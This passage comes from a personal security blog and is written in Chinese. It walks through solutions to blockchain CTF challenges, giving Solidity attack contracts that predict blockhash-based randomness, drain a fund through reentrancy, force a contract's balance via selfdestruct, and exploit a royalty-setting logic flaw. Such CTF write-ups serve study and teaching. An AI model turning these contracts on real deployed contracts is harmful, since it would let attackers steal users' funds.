<p><code>entropy = blockhash(block.number)</code>，但是我們沒辦法知道這個 block 的 blockhash，因為這個 block 還沒算完<br>
但這樣寫不會有錯誤，只是出來的值會是 <code>0</code><br>
既然 <code>entropy = 0</code> 那就只剩 <code>entropy2</code>，而 <code>entropy2</code> 是根據 <code>msg.sender</code> 來的<br>
所以我們可以直接算出 <code>_seed</code> 的值<br>
可以直接用 <a target="_blank" rel="noopener" href="https://remix.ethereum.org">remix</a> 寫個簡單的 smart contract 幫我們算那個值，然後利用 <code>event</code> 來印出那個值 ( 當 print 用 )</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.9;</span><br><span class="line"></span><br><span class="line">contract test &#123;</span><br><span class="line">    event Log(bytes32 value);</span><br><span class="line"></span><br><span class="line">    function go () public &#123;</span><br><span class="line">        emit Log(keccak256(abi.encodePacked(msg.sender)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>或是直接寫一個攻擊合約，去呼叫 <code>play</code> 函式<br>
記得要先把這個合約加到 <code>authorizedToPlay</code>，如果是 gas 不夠就調高 gas limit 吧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.9;</span><br><span class="line"></span><br><span class="line">import &quot;./challenge.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract hack &#123;</span><br><span class="line">    function exploit(address payable _target) public payable &#123;</span><br><span class="line">        Lottery target = Lottery(_target);</span><br><span class="line"></span><br><span class="line">        bytes32 entropy2 = keccak256(abi.encodePacked(this));</span><br><span class="line">        uint256 seeds = uint256(entropy2);</span><br><span class="line"></span><br><span class="line">        target.play.value(msg.value)(seeds);</span><br><span class="line"></span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Trust-Fund">Trust Fund</h2>
<p>這題是經典的 reentrant attack</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.9;</span><br><span class="line"></span><br><span class="line">contract TrustFund &#123;</span><br><span class="line">    function withdraw() external &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract hack &#123;</span><br><span class="line">    address target = 0xd297ab1c9653295BdE4f6b2e32574Ac5DD994997;</span><br><span class="line">    uint count = 10;</span><br><span class="line"></span><br><span class="line">    function () external payable &#123;</span><br><span class="line">        if (count &gt; 0) &#123;</span><br><span class="line">            count--;</span><br><span class="line">            TrustFund trust = TrustFund(target);</span><br><span class="line">            trust.withdraw();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function exploit () public &#123;</span><br><span class="line">        TrustFund trust = TrustFund(target);</span><br><span class="line">        trust.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw () public &#123;</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Heads-or-Tails">Heads or Tails</h2>
<p>這題跟 Lottery 很像，不過用的是上一個 block 的 blockhash<br>
那就寫個攻擊合約去呼叫 <code>play</code>，就可以算出一樣的 <code>entropy</code><br>
給 <code>0.1 ether</code> 能賺 <code>0.05 ether</code>，所以玩個 20 次就把錢全部撈出來啦<br>
記得要寫 <code>fallback</code> 函式才能接錢進來呀 ( 我這裡卡超久der )</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.9;</span><br><span class="line"></span><br><span class="line">contract HeadsOrTails &#123;</span><br><span class="line">    function play(bool _heads) external payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract hack &#123;</span><br><span class="line">    address target = 0xf8583ccB9900615e0b8304A16539EBFD96c2B0af;</span><br><span class="line"></span><br><span class="line">	function () external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function exploit () public payable &#123;</span><br><span class="line">        bytes32 entropy = blockhash(block.number - 1);</span><br><span class="line">        bool coinFlip = (entropy[0] &amp; &#x27;\x01&#x27;) == &#x27;\x01&#x27;;</span><br><span class="line"></span><br><span class="line">        HeadsOrTails heads = HeadsOrTails(target);</span><br><span class="line"></span><br><span class="line">		for (uint i = 0; i &lt; 20; i++) &#123;</span><br><span class="line">			heads.play.value(0.1 ether)(coinFlip);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Record-Label">Record Label</h2>
<p>這題的題目很長，主要的邏輯就是你領錢的時候會被 <code>royalties</code> 抽成，<code>manager</code> 會抽成 80 趴的錢錢<br>
所以如果直接呼叫 <code>withdrawFundsAndPayRoyalties</code> 就可以拿到 <code>0.2 ether</code>，<code>royalties</code> 抽走 <code>0.8 ether</code>，這題就解掉了 ( 題目合約 <code>balance = 0</code> )<br>
不過正確的解法 ( 我全都要 ) 應該是找出 <code>_manager</code> 的地址，然後呼叫 <code>addRoyaltyReceiver</code> 把 <code>receiverToPercentOfProfit</code> 這個 mapping 中 <code>_manager</code> 的 percent 覆寫成 0<br>
這樣去領錢就不會被抽成了</p>
<h2 id="Slot-Machine">Slot Machine</h2>
<p>這題的題目很短，就一個 <code>fallback</code> 函式<br>
但是第一行限制一次只能匯款 <code>1 szabo</code> ( <code>0.000001 ether</code> )<br>
目標是要讓這個合約的 balance 大於等於 <code>5 ether</code>，他就會把所有錢錢都給你<br>
其中一個不透過 <code>fallback</code> 給錢的方法就是用 <code>selfdestruct</code><br>
<code>selfdestruct</code> 就是把合約清除掉，在被清除掉之前，這個合約可以把他的錢錢匯款給一個帳戶，而這個匯款的動作不會經過 <code>fallback</code> 函式<br>
寫一個攻擊合約，並給他 <code>5 ether</code>，讓他自我毀滅，並在毀滅之前把 <code>5 ether</code> 匯款給題目合約</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.9;</span><br><span class="line"></span><br><span class="line">contract hack &#123;</span><br><span class="line">    function exploit () public payable &#123;</span><br><span class="line">        selfdestruct(address(0x22f616f6b95e23efa8FBBAE44BeeC05890E12A4E));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<ol>
<li><a target="_blank" rel="noopener" href="https://f3real.github.io/tag/ethereum.html">https://f3real.github.io/tag/ethereum.html</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2759">https://xz.aliyun.com/t/2759</a></li>
</ol>
</div><div class="article-more-container"><a class="article-more button is-small is-size-7" href="/2019/06/07/blockchain-ctf/#more">Read more</a></div></article></div><nav class="pagination" role="navigation" aria-label="pagination"><div class="pagination-previous"><a href="/">Previous</a></div><div class="pagination-next"><a href="/page/3/">Next</a></div><ul class="pagination-list is-hidden-mobile"><li><a class="pagination-link" href="/">1</a></li><li><a class="pagination-link is-current" href="/page/2/">2</a></li><li><a class="pagination-link" href="/page/3/">3</a></li><li><a class="pagination-link" href="/page/4/">4</a></li></ul></nav></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/images/avatar.png" alt="oalieno"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">oalieno</p><p class="is-size-6 is-block">資安研究員</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Taiwan</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives"><p class="title">35</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Categories</p><a href="/categories"><p class="title">8</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags"><p class="title">50</p></a></div></div></nav><div class="level"><a class="level-item button is-primary" href="https://github.com/oalieno" target="_blank" rel="noopener">Follow</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/oalieno"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com/oalieno"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Linkedin" href="https://www.linkedin.com/in/oalieno/"><i class="fab fa-linkedin"></i></a></div></div></div><!--!--><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">Categories</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/AI/"><span class="level-start"><span class="level-item">AI</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E5%8D%80%E5%A1%8A%E9%8D%8A/"><span class="level-start"><span class="level-item">區塊鍊</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%BC%94%E7%AE%97%E6%B3%95/"><span class="level-start"><span class="level-item">演算法</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/categories/%E7%A8%8B%E5%BC%8F/"><span class="level-start"><span class="level-item">程式</span></span><span class="level-end"><span class="level-item tag">13</span></span></a></li><li><a class="level is-mobile" href="/categories/%E8%B3%87%E5%AE%89/"><span class="level-start"><span class="level-item">資安</span></span><span class="level-end"><span class="level-item tag">16</span></span></a><ul><li><a class="level is-mobile" href="/categories/%E8%B3%87%E5%AE%89/pwn/"><span class="level-start"><span class="level-item">pwn</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E8%B3%87%E5%AE%89/reverse/"><span class="level-start"><span class="level-item">reverse</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/categories/%E8%B3%87%E5%AE%89/writeups/"><span class="level-start"><span class="level-item">writeups</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li></ul></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-12-21T16:00:00.000Z">2022-12-22</time></p><p class="title"><a href="/2022/12/22/chatgpt-wootalk/">【Chatgpt】AI 大戰匿名聊天軟體</a></p><p class="categories"><a href="/categories/AI/">AI</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-12-14T16:00:00.000Z">2022-12-15</time></p><p class="title"><a href="/2022/12/15/wtf-powershell/">【Powershell】WTF Powershell</a></p><p class="categories"><a href="/categories/%E7%A8%8B%E5%BC%8F/">程式</a></p></div></article><article class="media"><figure class="media-left"><a class="image" href="/2022/11/12/flare-on-9/zh-tw/"><p align="center"><img data-src="/images/flare-on-9.png" class=" lazyload" alt="【Writeups】Flare-on 9"></p></a></figure><div class="media-content"><p class="date"><time dateTime="2022-11-11T16:00:00.000Z">2022-11-12</time></p><p class="title"><a href="/2022/11/12/flare-on-9/zh-tw/">【Writeups】Flare-on 9</a></p><p class="categories"><a href="/categories/%E8%B3%87%E5%AE%89/">資安</a> / <a href="/categories/%E8%B3%87%E5%AE%89/writeups/">writeups</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-11-08T16:00:00.000Z">2022-11-09</time></p><p class="title"><a href="/2022/11/09/cve-2022-41049/">【漏洞分析】CVE-2022-41049</a></p><p class="categories"><a href="/categories/%E8%B3%87%E5%AE%89/">資安</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-10-31T16:00:00.000Z">2022-11-01</time></p><p class="title"><a href="/2022/11/01/MpDlpCmd/en/">【Windows Security】MpDlpCmd.exe</a></p><p class="categories"><a href="/categories/%E8%B3%87%E5%AE%89/">資安</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">Archives</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2022/12/"><span class="level-start"><span class="level-item">December 2022</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/11/"><span class="level-start"><span class="level-item">November 2022</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/03/"><span class="level-start"><span class="level-item">March 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/02/"><span class="level-start"><span class="level-item">February 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/08/"><span class="level-start"><span class="level-item">August 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/07/"><span class="level-start"><span class="level-item">July 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/06/"><span class="level-start"><span class="level-item">June 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/05/"><span class="level-start"><span class="level-item">May 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/03/"><span class="level-start"><span class="level-item">March 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/02/"><span class="level-start"><span class="level-item">February 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/01/"><span class="level-start"><span class="level-item">January 2020</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/09/"><span class="level-start"><span class="level-item">September 2019</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/06/"><span class="level-start"><span class="level-item">June 2019</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/05/"><span class="level-start"><span class="level-item">May 2019</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/04/"><span class="level-start"><span class="level-item">April 2019</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/03/"><span class="level-start"><span class="level-item">March 2019</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/01/"><span class="level-start"><span class="level-item">January 2019</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2018/09/"><span class="level-start"><span class="level-item">September 2018</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2018/08/"><span class="level-start"><span class="level-item">August 2018</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2018/02/"><span class="level-start"><span class="level-item">February 2018</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">Tags</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/GIL/"><span class="tag">GIL</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/adb/"><span class="tag">adb</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ai/"><span class="tag">ai</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/algorithm/"><span class="tag">algorithm</span><span class="tag">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/android/"><span class="tag">android</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/blockchain/"><span class="tag">blockchain</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/blog/"><span class="tag">blog</span><span class="tag">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/burp/"><span class="tag">burp</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/c/"><span class="tag">c++</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/chatgpt/"><span class="tag">chatgpt</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/command/"><span class="tag">command</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/crypto/"><span class="tag">crypto</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ctf/"><span class="tag">ctf</span><span class="tag">7</span></a></div><div class="control"><a class="tags has-addons" href="/tags/cve/"><span class="tag">cve</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/dapper-labs/"><span class="tag">dapper labs</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/drony/"><span class="tag">drony</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/flare/"><span class="tag">flare</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/flare-on/"><span class="tag">flare-on</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/flow/"><span class="tag">flow</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/frida/"><span class="tag">frida</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/gdb/"><span class="tag">gdb</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/hexo/"><span class="tag">hexo</span><span class="tag">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/icarus/"><span class="tag">icarus</span><span class="tag">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/kernel/"><span class="tag">kernel</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/nord/"><span class="tag">nord</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/nox/"><span class="tag">nox</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/osint/"><span class="tag">osint</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/powerlevel10k/"><span class="tag">powerlevel10k</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/powerlevel9k/"><span class="tag">powerlevel9k</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/powershell/"><span class="tag">powershell</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/proxy/"><span class="tag">proxy</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pwn/"><span class="tag">pwn</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pyc/"><span class="tag">pyc</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/python/"><span class="tag">python</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/reverse/"><span class="tag">reverse</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/reverse-engineering/"><span class="tag">reverse engineering</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/reverse-ssh/"><span class="tag">reverse ssh</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/rootkit/"><span class="tag">rootkit</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/rsa/"><span class="tag">rsa</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/security/"><span class="tag">security</span><span class="tag">15</span></a></div><div class="control"><a class="tags has-addons" href="/tags/seo/"><span class="tag">seo</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/srop/"><span class="tag">srop</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ssh/"><span class="tag">ssh</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/tunnel/"><span class="tag">tunnel</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/windows/"><span class="tag">windows</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/windows-defender/"><span class="tag">windows defender</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/wootalk/"><span class="tag">wootalk</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/writeups/"><span class="tag">writeups</span><span class="tag">6</span></a></div><div class="control"><a class="tags has-addons" href="/tags/zimfw/"><span class="tag">zimfw</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/zsh/"><span class="tag">zsh</span><span class="tag">1</span></a></div></div></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/">歐欸利恩的部落格</a><p class="is-size-7"><span>&copy; 2022 oalieno</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a><br><span id="busuanzi_container_site_uv">Visited by <span id="busuanzi_value_site_uv">0</span> users</span></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/oalieno"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "This website uses cookies to improve your experience.",
          dismiss: "Got it!",
          allow: "Allow cookies",
          deny: "Decline",
          link: "Learn more",
          policy: "Cookie Policy",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/auto-render.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/mhchem.min.js" defer></script><script>window.addEventListener("load", function() {
            document.querySelectorAll('[role="article"] > .content').forEach(function(element) {
                renderMathInElement(element);
            });
        });</script><script type="text/x-mathjax-config">MathJax.Hub.Config({
            'HTML-CSS': {
                matchFontHeight: false
            },
            SVG: {
                matchFontHeight: false
            },
            CommonHTML: {
                matchFontHeight: false
            },
            tex2jax: {
                inlineMath: [
                    ['$','$'],
                    ['\\(','\\)']
                ]
            }
        });</script><script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.9/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><script src="https://cdnjs.cloudflare.com/ajax/libs/lazysizes/5.3.2/lazysizes.min.js" integrity="sha512-q583ppKrCRc7N5O0n2nzUiJ+suUv7Et1JGels4bXOaMFQcamPk9HjdUknZuuFjBNs7tsMuadge5k9RzdmO+1GQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script></body></html>